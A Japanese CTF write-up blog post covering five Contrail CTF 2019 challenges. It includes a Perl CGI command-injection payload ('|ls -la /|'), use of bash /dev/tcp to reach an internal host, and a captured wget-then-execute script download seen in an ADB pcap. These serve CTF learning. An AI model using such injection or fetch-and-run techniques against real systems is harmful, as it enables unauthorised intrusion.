---
layout: post
title: Contrail CTF 2019 の write-up
categories: [ctf]
date: 2020-01-04 05:30:00 +0900
---

昨年の 12 月 31 日から今年の 1 月 3 日にかけて、なんと年をまたいで開催された [Contrail CTF 2019](http://3percent.blue/) に、チーム zer0pts として参加しました。最終的にチームで 4786 点を獲得し、順位は得点 78 チーム中 1 位でした。うち、私は 5 問を解いて 756 点を入れました。

他のメンバーの write-up はこちら。

- [Contrail CTF 2019のWriteup - CTFするぞ](https://ptr-yudai.hatenablog.com/entry/2020/01/04/000225)

以下、私が解いた問題の write-up です。

## [Forensics 100] Persistence (23 solves)
> Can you find persistence? https://www.dropbox.com/s/yoge7ix39jyrpnv/forensics_persistence.arn?dl=0
> 
> author narupi

与えられた URL にアクセスすると `forensics_persistence.arn` というファイルがダウンロードできました。`file` コマンドに投げてどのようなファイルか確認してみましょう。

```
$ file forensics_persistence.arn
forensics_persistence.arn: data
$ xxd forensics_persistence.arn | head
0000000: 4152 4e5f 0600 0000 1400 0000 1d00 0000  ARN_............
0000010: 0100 0000 0800 0000 0800 0000 424d 7e00  ............BM~.
0000020: 0000 0000 0000 3e00 0000 2800 0000 1000  ......>...(.....
0000030: 0000 1000 0000 0100 0100 0000 0000 4000  ..............@.
0000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000050: 0000 0000 0000 ffff ff00 003f 0000 001f  ...........?....
0000060: 0000 000f 0000 0007 0000 0007 0000 0007  ................
0000070: 0000 0007 0000 0007 0000 0007 0000 8003  ................
0000080: 0000 c001 0000 e020 0000 ff11 0000 fe0b  ....... ........
0000090: 0000 ff1f 0000 ffbf 0000 424d 3604 0000  ..........BM6...
```

ARN とは。`strings` でどのような文字列が含まれるか確認しましょう。

```
$ strings -e l -n 8 forensics_persistence.arn
︙
HKLM\Software\Wow6432Node\Microsoft\Office\Access\Addins
HKCU\Software\Wow6432Node\Microsoft\Office\Access\Addins
HKLM\Software\Microsoft\Office\Onenote\Addins
HKCU\Software\Microsoft\Office\Onenote\Addins
HKLM\Software\Wow6432Node\Microsoft\Office\Onenote\Addins
HKCU\Software\Wow6432Node\Microsoft\Office\Onenote\Addins
HKLM\SOFTWARE\Microsoft\Office test\Special\Perf\(Default)
HKCU\SOFTWARE\Microsoft\Office test\Special\Perf\(Default)
HKLM\SOFTWARE\Microsoft\Office test\Special\Perf\(Default)
HKCU\SOFTWARE\Microsoft\Office test\Special\Perf\(Default)
```

UTF-16 かなにかでレジストリのキーっぽい文字列が多く含まれており、Windows のメモリダンプっぽい雰囲気があります。フラグが生で含まれていないか確認しましょう。

```
$ strings -e l -n 8 forensics_persistence.arn | grep ctrctf
"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -Command ".\flag_is_ctrctf{P3rs1st3nc3_5ch3dul3d_Ta3ks}.ps1"v
c:\windows\system32\windowspowershell\v1.0\.\flag_is_ctrctf{p3rs1st3nc3_5ch3dul3d_ta3ks}.ps1
```

フラグが得られました。

```
ctrctf{p3rs1st3nc3_5ch3dul3d_ta3ks}
```

## [Misc 100] Lets_Connct (16 solves)
> (問題サーバへの接続情報)
> 
> author pr0xy

ほとんど情報が与えられていません。とりあえず問題サーバに接続してみましょう。

```
$ nc (省略)
bash-4.4$ pwd
pwd
/
bash-4.4$ ls -la
ls -la
total 1140
drwxr-x--- 1 0 1000    4096 Dec 30 08:53 .
drwxr-x--- 1 0 1000    4096 Dec 30 08:53 ..
-rwxr-x--- 1 0 1000     220 Apr  4  2018 .bash_logout
-rwxr-x--- 1 0 1000    3771 Apr  4  2018 .bashrc
-rwxr-x--- 1 0 1000     807 Apr  4  2018 .profile
-rwxr-x--- 1 0 1000 1113504 Dec 30 04:53 bash
drwxr-x--- 1 0 1000    4096 Dec 30 08:53 bin
drwxr-x--- 1 0 1000    4096 Dec 30 04:54 dev
-rwxr----- 1 0 1000      44 Jan  3 11:59 flag
drwxr-x--- 1 0 1000    4096 Dec 30 04:54 lib
drwxr-x--- 1 0 1000    4096 Dec 30 04:54 lib32
drwxr-x--- 1 0 1000    4096 Dec 30 04:54 lib64
bash-4.4$ cat flag
cat flag
bash: cat: command not found
```

やったーフラグだー! という喜びも束の間、`flag` を読もうとしたところ `cat` コマンドがないと怒られてしまいました。とりあえず、タブキーを 2 回押してどのようなコマンドが使えるか確認しましょう。

```
bash-4.4$ 

!          case       done       fg         let        return     true
./         cd         echo       fi         local      select     type
:          command    elif       for        logout     set        typeset
[          compgen    else       function   ls         shift      ulimit
[[         complete   enable     getopts    mapfile    shopt      umask
]]         compopt    esac       hash       popd       source     unalias
alias      continue   eval       help       printf     suspend    unset
bg         coproc     exec       history    pushd      test       until
bind       declare    exit       if         pwd        then       wait
break      dirs       export     in         read       time       while
builtin    disown     false      jobs       readarray  times      {
caller     do         fc         kill       readonly   trap       }
```

なるほど、`bash` の組み込みコマンド以外にはほとんど何もなさそうです。これだけで何かできないか `bash` の `man` を読んでいると、以下のような記述が見つかりました。

> The command substitution **$(cat** _file_) can be replaced by the equivalent but faster $(< _file_).

なるほどなるほど。これで `flag` が読めないか試してみましょう。

```
bash-4.4$ echo "$(<flag)"
echo "$(<flag)"
Flag has moved to 3000 port on 172.17.0.5 .
```

`172.17.0.5:3000` に接続する必要があるようです。これも `bash` だけでなんとかできないか探すと、`bash` の `man` に以下のような記述が見つかりました。

> **/dev/tcp/**_host_/_port_
>        If _host_ is a valid hostname or Internet address, and _port_ is an integer port number or service name, **bash** attempts to open the corresponding TCP socket.

これを使って接続してみましょう。

```
bash-4.4$ exec 3<> /dev/tcp/172.17.0.5/3000; ./bash <&3
exec 3<> /dev/tcp/172.17.0.5/3000; ./bash <&3
./bash: line 1: ctrctf{b4sh_1s_a_mul7ifuncti0n_sh3ll}: command not found
```

フラグが得られました。

```
ctrctf{b4sh_1s_a_mul7ifuncti0n_sh3ll}
```

## [Misc 356] prime_number (7 solves)
> it's secret call...
> https://youtu.be/-mEdbrioxqY
> 
> note : password is upper case.
> 
> author aqua
> 
> 添付ファイル: secret.zip, secret_call.wav

`secret.zip` は暗号化された ZIP ファイルです。`secret_call.wav` からパスワードを得て復号しろということでしょう。

`secret_call.wav` を再生してみると、ピポパ音が流れてきました。DTMF でしょう。適当なデコーダに通すと `53 37 11 2 67 11 61 11 41 11 41 3 11 61 7 71 41 13` を意味していることがわかります。

さて、これらの数値は何を意味するのでしょうか。問題名が `prime_number` でかついずれの数値も素数であること、ヒントとして `password is upper case.` が与えられていること (パスワードはおそらく英大文字だけで構成される) ことに注目します。その数値が i 番目の素数であれば i 番目のアルファベットに置き換えるという処理をしてみましょう。

```python
import string
primes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97]
encoded = [53, 37, 11, 2, 67, 11, 61, 11, 41, 11, 41, 3, 11, 61, 7, 71, 41, 13]
print(''.join(string.ascii_uppercase[primes.index(x)] for x in encoded))
```

```
$ python solve.py
PLEASEREMEMBERDTMF
```

意味の通る文字列が出てきました。これをパスワードとして `secret.zip` を展開すると `flag.txt` というフラグの書かれたファイルが出てきました。

```
ctrctf{d0_y0u_r3m3mb3r_dtmf?}
```

## [Web 100] LegacyBlog (17 solves)
> I found old mini blog in hdd.
> 
> author douro
> 
> http://(省略)/cgi-bin/viewer.pl

拡張子から Perl と推測できます。与えられた URL にアクセスすると、以下のようなコンテンツが返ってきました。

```html

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html lang="en">
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">

	<title>HELLO</title>

<link rel="stylesheet" type="text/css" href="/css/styles.css">

	<link rel="stylesheet" type="text/css" href="/styles.css">
	<script src="//code.jquery.com/jquery-latest.min.js" type="text/javascript"></script>
	<script type="text/javascript" src="/script.js"></script>

</head>
 
<body>


<h1>My Test Blog</h1>
<h2>this is blank page</h2>
<hr class="topbar">

<p class="clear">
<div id='cssmenu'>
<ul>
   <li class='active has-sub'><a href='/' title="HOME"><span>HOME</span></a>
<ul>
 <li><a href='/cgi-bin/viewer.pl?text=about' title="about me"><span>About Me</span></a></li>
</ul></li>


<h1 class="tophead">Hello World</h1>
```

`/cgi-bin/viewer.pl?text=about` にアクセスすると `My name is Bob.` と表示されました。`/cgi-bin/about` にアクセスすると `Internal Server Error` が出たことから、GET パラメータとして与えられたファイルをそのまま読んでいるものと推測できます。

Perl で好きなファイルを読み込める状況といえば、[`open('ls|')` のように `|` で終わる文字列を `open` に投げると OS コマンドが実行できる](https://www.ipa.go.jp/security/awareness/vendor/programmingv1/a04_01.html)仕様です。試しに `/cgi-bin/viewer.pl?text=|ls%20-la%20/|` にアクセスしてみると、以下のように `ls -la /` を実行することができました。

```
total 92
drwxr-xr-x 1 root root 4096 Jan 3 15:21 .
drwxr-xr-x 1 root root 4096 Jan 3 15:21 ..
-rwxr-xr-x 1 root root 0 Jan 3 15:21 .dockerenv
drwxr-xr-x 1 root root 4096 Dec 28 12:41 bin
drwxr-xr-x 2 root root 4096 Apr 12 2016 boot
drwxr-xr-x 5 root root 360 Jan 3 15:21 dev
drwxr-xr-x 1 root root 4096 Jan 3 15:21 etc
-rw-rw-rw- 1 root root 8296 Dec 28 14:42 flag
drwxr-xr-x 2 root root 4096 Apr 12 2016 home
drwxr-xr-x 1 root root 4096 Dec 28 12:41 lib
drwxr-xr-x 2 root root 4096 Dec 12 01:51 lib64
drwxr-xr-x 2 root root 4096 Dec 12 01:51 media
drwxr-xr-x 2 root root 4096 Dec 12 01:51 mnt
drwxr-xr-x 2 root root 4096 Dec 12 01:51 opt
dr-xr-xr-x 18523 root root 0 Jan 3 15:21 proc
drwx------ 2 root root 4096 Dec 12 01:51 root
drwxr-xr-x 1 root root 4096 Dec 28 12:42 run
drwxr-xr-x 1 root root 4096 Dec 28 12:41 sbin
drwxr-xr-x 2 root root 4096 Dec 12 01:51 srv
dr-xr-xr-x 13 root root 0 Jan 3 06:22 sys
drwxrwxrwt 1 root root 4096 Jan 3 15:21 tmp
drwxr-xr-x 1 root root 4096 Dec 12 01:51 usr
drwxr-xr-x 1 root root 4096 Dec 28 12:41 var
```

`/flag` を読めばよさそうです。`cat /flag` してみましょう。

```
ELF…ctrctf{Th1s_1s_01d_cg1_exp101t}…
```

ELF ファイルが出てきましたがフラグを得られたので問題ありません。

```
ctrctf{Th1s_1s_01d_cg1_exp101t}
```

## [Network 100] debug_port (44 solves)
> A suspicious script has been executed. https://www.dropbox.com/s/zw76f3qm2k0x3g1/network_debug_port.pcapng?dl=0
> 
> author narupi

与えられた URL にアクセスすると `network_debug_port.pcapng` という pcapng ファイルがダウンロードできました。

Wireshark でパケットを眺めていると、`192.168.56.103:5555` と `192.168.56.1:34688` の間で以下のような通信をしている様子が確認できました。

```
CNXN........#...<
......host::features=stat_v2,cmd,shell_v2CNXN........q....)......device::ro.product.name=android_x86_64;ro.product.model=VirtualBox;ro.product.device=x86_64;features=cmd,shell_v2OPEND.......0...........shell,v2,TERM=xterm-256color,raw:ls -a -d 'sd'*.OKAY-...D...............WRTED...-....................55x104,0x0.OKAY-...D...............WRTE-...D....................sdcard
OKAYD...-...............WRTE-...D.....................CLSE-...D...............OKAYD...-...............CLSED...-...............CLSE-...D...............OPENH...................sync:.OKAY....H...............WRTEH...................STAT....sdcardOKAY....H...............WRTE....H.......8.......STAT.........Z.]OKAYH...................WRTEH...................STAT....sdcard/OKAY....H...............WRTE....H...............STAT.A.......s.]OKAYH...................WRTEH.......\...........SEND....sdcard/getscript.sh,33188DATA+...wget 192.168.56.101/dl/f1ag.sh -P /sdcard/
DONE.p.]
︙
```

`wget 192.168.56.101/dl/f1ag.sh` のように怪しげな文字列が見えます。読み進めます。

```
OKAYL.../...............WRTEL.../.......
............	OKAY/...L...............WRTE/...L....................
x86_64:/sdcard $ sh f1ag.sh                                                                            ............................................................................ OKAYL.../...............WRTEL.../....................
OKAY/...L...............WRTE/...L.......(............

OKAYL.../...............WRTE/...L...s...F%.......n...ZWNobyAnY29uZ3JhdHVsYXRpb25zIScKZWNobyAnZmxhZyBpcyAiY3RyY3Rme2QxZF95MHVfY2wwNTNkXzdoM181NTU1X3Awcjc/fSInIAo=
OKAYL.../...............WRTE/...L....................x86_64:/sdcard $ OKAYL.../...............WRTEL.../.......f............eOKAY/...L...............WRTE/...L.......g............eOKAYL.../...............WRTEL.../.......y............xOKAY/...L...............WRTE/...L.......z............xOKAYL.../...............WRTEL.../.......j............iOKAY/...L...............WRTE/...L.......k............iOKAYL.../...............WRTEL.../.......u............tOKAY/...L...............WRTE/...L.......v............tOKAYL.../...............WRTEL.../....................
OKAY/...L...............WRTE/...L.......,............

......CLSE/...L...............OKAYL.../...............CLSEL.../...............CLSE/...L...............
```

怪しげな Base64 されたと思しき文字列があります。デコードしてみましょう。

```
$ echo ZWNobyAnY29uZ3JhdHVsYXRpb25zIScKZWNobyAnZmxhZyBpcyAiY3RyY3Rme2QxZF95MHVfY2wwNTNkXzdoM181NTU1X3Awcjc/fSInIAo= | base64 -d -
echo 'congratulations!'
echo 'flag is "ctrctf{d1d_y0u_cl053d_7h3_5555_p0r7?}"' 
```

フラグが得られました。

```
ctrctf{d1d_y0u_cl053d_7h3_5555_p0r7?}
```